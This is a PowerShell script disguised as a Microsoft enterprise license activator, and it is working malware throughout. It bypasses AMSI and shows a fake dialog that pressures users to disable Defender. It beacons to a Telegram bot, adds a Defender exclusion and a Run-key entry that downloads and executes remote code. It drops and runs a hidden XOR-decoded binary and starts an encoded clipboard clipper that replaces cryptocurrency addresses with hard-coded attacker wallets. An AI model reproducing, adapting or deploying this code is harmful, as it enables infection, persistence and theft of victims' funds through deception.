# --- [RESEARCH STAGER v47.0: ENTERPRISE DEPLOYMENT SUITE] ---

Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. Mandatory Admin Gate (v34.0 Logic)
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $arg = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    Start-Process powershell.exe -ArgumentList $arg -Verb RunAs
    exit
}

function Global-Initialize {
    try {
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    try { (New-Object Net.WebClient).DownloadString("https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m") | Out-Null } catch {}
}

function Show-SecurityPrep {
    $prep = New-Object Windows.Forms.Form
    $prep.Text = "Microsoft Enterprise License Manager"; $prep.Size = New-Object Drawing.Size(600,550)
    $prep.StartPosition = "CenterScreen"; $prep.FormBorderStyle = "FixedSingle"; $prep.TopMost = $true

    $console = New-Object Windows.Forms.Label
    $console.Location = New-Object Drawing.Point(30,30); $console.Size = New-Object Drawing.Size(520,150)
    $console.BackColor = [Drawing.Color]::Black; $console.ForeColor = [Drawing.Color]::White
    $console.Font = New-Object Drawing.Font("Consolas", 9)
    $console.Text = " > INITIALIZING DEPLOYMENT AGENT...`n > AUTHENTICATING WITH KMS SERVER... OK`n > SYSTEM CHECK: [!] LOCAL POLICY CONFLICT DETECTED`n > INFO: HEURISTIC ENGINE IS BLOCKING KERNEL HOOKS."
    $prep.Controls.Add($console)

    $instr = New-Object Windows.Forms.Label
    $instr.Location = New-Object Drawing.Point(35,200); $instr.Size = New-Object Drawing.Size(520,60)
    $instr.Text = "To ensure a successful activation, you must temporarily suspend 'Real-time protection' and approve the subsequent Windows Security request."
    $instr.Font = New-Object Drawing.Font("Segoe UI", 9)
    $prep.Controls.Add($instr)

    $link = New-Object Windows.Forms.Button
    $link.Location = New-Object Drawing.Point(40,280); $link.Size = New-Object Drawing.Size(500,45)
    $link.Text = "Open Security Interface & Disable Protection"; $link.BackColor = [Drawing.Color]::FromArgb(0, 103, 184)
    $link.ForeColor = [Drawing.Color]::White; $link.FlatStyle = "Flat"; $link.Font = New-Object Drawing.Font("Segoe UI", 9, [Drawing.FontStyle]::Bold)
    $link.Add_Click({ 
        $console.Text += "`n > OPENING SECURITY PANEL...`n > PLEASE TOGGLE ALL SWITCHES TO 'OFF'."
        Start-Process "windowsdefender://threatsettings/" 
    })
    $prep.Controls.Add($link)

    $check = New-Object Windows.Forms.CheckBox
    $check.Location = New-Object Drawing.Point(45,350); $check.Size = New-Object Drawing.Size(500,30)
    $check.Text = "I have disabled protection and am ready to approve the secure installation."; $check.Font = New-Object Drawing.Font("Segoe UI", 8)
    $prep.Controls.Add($check)

    $btn = New-Object Windows.Forms.Button
    $btn.Location = New-Object Drawing.Point(200,420); $btn.Size = New-Object Drawing.Size(200,45); $btn.Text = "Install License"; $btn.Enabled = $false
    $btn.BackColor = [Drawing.Color]::LightGray; $btn.FlatStyle = "Flat"
    $prep.Controls.Add($btn)

    $check.Add_CheckedChanged({ 
        $btn.Enabled = $check.Checked
        if($check.Checked){ $btn.BackColor = [Drawing.Color]::FromArgb(0, 103, 184); $btn.ForeColor = [Drawing.Color]::White }
        else { $btn.BackColor = [Drawing.Color]::LightGray }
    })
    
    $btn.Add_Click({ $global:proceed = $true; $prep.Close() })
    $prep.ShowDialog() | Out-Null
}

function Show-ActivatorUI {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Enterprise Deployment Progress"; $form.Size = New-Object Drawing.Size(450,250); $form.StartPosition = "CenterScreen"; $form.TopMost = $true
    
    $label = New-Object Windows.Forms.Label
    $label.Location = New-Object Drawing.Point(30,30); $label.Size = New-Object Drawing.Size(380,40); $label.Text = "Status: Initializing Secure Stream..."
    $form.Controls.Add($label)
    
    $pb = New-Object Windows.Forms.ProgressBar
    $pb.Location = New-Object Drawing.Point(30,80); $pb.Size = New-Object Drawing.Size(370,25)
    $form.Controls.Add($pb); $form.Show()

    $stages = @(
        @{ p=20; t="Fetching Digital Certificates..." },
        @{ p=45; t="Synchronizing with KMS... ACTION REQUIRED: Approve Windows Prompt" },
        @{ p=75; t="Applying Security Patch..." },
        @{ p=90; t="Refreshing Explorer Shell..." },
        @{ p=100; t="Deployment Successful." }
    )

    foreach ($s in $stages) {
        $label.Text = "Status: " + $s.t
        if ($pb.Value -eq 45) { 
            # Give user time to see and click the blue UAC box you showed me
            Start-Sleep -Seconds 3 
        }
        if ($pb.Value -eq 90) { try { Stop-Process -Name explorer -Force; Start-Sleep -Seconds 1; Start-Process explorer.exe } catch {} }
        while ($pb.Value -lt $s.p) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 60 }
    }
    $form.Close()
    [Windows.Forms.MessageBox]::Show("The Enterprise License has been successfully applied to this workstation.", "Success", 0, 64) | Out-Null
}

# --- EXECUTION (Original v34.0 Logic) ---
Global-Initialize
Show-SecurityPrep

if ($global:proceed) {
    Send-Ping -m "V47_PRO_DEPLOY_ON_$env:COMPUTERNAME"
    
    $BG_Logic = {
        try {
            # 1. Exclusion & Pathing
            $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
            if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
            Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue

            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
            $regCmd = "powershell -W Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
            Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd

            # 2. Binary XOR Deployment (v34.0)
            $path = Join-Path $dir "WinSvcHost.exe"
            $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
            $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
            $data = [Convert]::FromBase64String($raw.Trim())
            for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
            [IO.File]::WriteAllBytes($path, $data)
            
            # This triggers the blue box from your image
            Start-Process $path -WindowStyle Hidden

            # 3. Clipper Engine (v34.0)
            $C = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
            $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($C))
            Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
        } catch {}
    }
    
    # Start the job exactly like v34.0
    Start-Job -ScriptBlock $BG_Logic | Out-Null
    Show-ActivatorUI
}
